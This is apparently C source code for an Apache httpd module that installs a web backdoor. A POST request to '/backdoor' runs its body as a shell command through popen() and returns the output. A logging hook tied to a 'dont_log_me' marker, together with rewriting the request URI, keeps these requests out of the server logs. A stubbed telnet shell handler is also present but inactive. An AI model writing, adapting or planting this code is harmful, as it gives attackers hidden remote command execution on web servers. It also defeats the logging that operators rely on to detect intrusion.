#include "httpd.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_request.h"
#include <stdio.h>

static void register_hooks(apr_pool_t *pool);
static int winchester_handler(request_rec *r);
static int backblast_handler(request_rec *r);

// very early handler
static int winchester_handler(request_rec *r)
{
	if (!r->unparsed_uri) {
        // no uri, pass
        return DECLINED;
    }

    // sub-handler for post backdoor
    if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST) {
        apr_bucket_brigade *bb_in;
        apr_bucket *bucket;
        apr_status_t rc;
        char line[128];
        FILE *pipe;
        
        // wipe uri
        r->unparsed_uri = "/";
        r->parsed_uri.scheme = "/";
        r->parsed_uri.hostname = "/";
        r->parsed_uri.path = "/";
        r->filename = "dont_log_me";

        // create bucket brigade to store body
        bb_in = apr_brigade_create(r->pool, r->connection->bucket_alloc);
        ap_rprintf(r, "Created brigade\n");

        // get request body from filters, store in bucket
        rc = ap_get_brigade(r->input_filters, bb_in, AP_MODE_READBYTES, APR_BLOCK_READ, HUGE_STRING_LEN);
        ap_rprintf(r, "Got brigade from filters\n");
        // check error code on last op
        if (rc != APR_SUCCESS) {
            ap_rprintf(r, "Error code %n on attempt\n", rc);
            return DONE;
        }

        // read from new brigade
        for (bucket = APR_BRIGADE_FIRST(bb_in);
             bucket != APR_BRIGADE_SENTINEL(bb_in);
             bucket = APR_BUCKET_NEXT(bucket))
        {
            const char *buf;
            apr_size_t buflen;
            
            rc = apr_bucket_read(bucket, &buf, &buflen, APR_BLOCK_READ);
            if (rc != APR_SUCCESS) {
                ap_rprintf(r, "Error code %n on attempt\n", rc);
                return DONE;
            }
            if (buf != NULL) {
                ap_rprintf(r, "\n\tBuffer: %s\n", buf);
            }

            // run buf in shell
            pipe = popen(buf, "r");
            while (fgets(line, 128, pipe)) {
                ap_rprintf(r, "\n\tResponse: %s\n", line);
            }
            int status = pclose(pipe);

        }
        //apr_brigade_cleanup(bb_in);
        //ap_rprintf(r, "Cleaned up brigade");
        ap_rprintf(r, "Operation successful!\n");

        ap_rprintf(r, "Backdoor POST");
        return DONE;
    }

    // didn't hit a backdoor dir, pass
	return DECLINED;
}

// telnet shell handler
static int shell_handler(conn_rec *c)
{
    return DECLINED;
}

// logging handler
static int backblast_handler(request_rec *r)
{
    if (strcmp(r->filename, "dont_log_me") == 0) {
        // if this filename does not appear, move along
        return DONE;
    }

    // if it does, throw DONE without logging
    return DECLINED;
}

static void register_hooks(apr_pool_t *pool)
{
    ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
    //ap_hook_process_connection(shell_handler, NULL, NULL, APR_HOOK_FIRST);
    ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA   winchester_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    register_hooks
};
